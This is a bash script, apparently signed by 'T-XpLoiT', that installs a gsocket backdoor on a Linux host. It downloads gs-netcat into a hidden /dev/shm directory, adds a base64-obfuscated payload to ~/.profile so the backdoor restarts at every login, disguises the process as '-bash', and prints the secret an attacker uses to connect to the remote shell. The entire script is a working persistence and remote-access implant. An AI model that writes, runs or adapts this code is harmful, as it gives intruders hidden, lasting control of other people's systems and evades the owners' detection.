#!/bin/bash
mkdir -p /dev/shm/.local/share/sys
path="/dev/shm/.local/share/sys"
pass=$($path/gs -g)
wget -q https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m);mv gs-* gs;chmod +x gs;mv gs $path

sleep 3

raw_payload="killall -0 \"-bash\" 2>/dev/null || (GSOCKET_ARGS=\"-s $pass -liqD\" SHELL=/bin/bash exec -a -bash $path/gs)"

encoded_payload=$(echo -n "$raw_payload" | base64 -w 0)

echo "eval \"\$(echo $encoded_payload | base64 -d)\"" >> ~/.profile

source ~/.profile

export GSOCKET_ARGS="-s $pass -li -q -D"
echo "CONNECT WITH : gs-netcat -is $pass "
exec -a -bash $path/gs

#gsocket instalation by T-XpLoiT
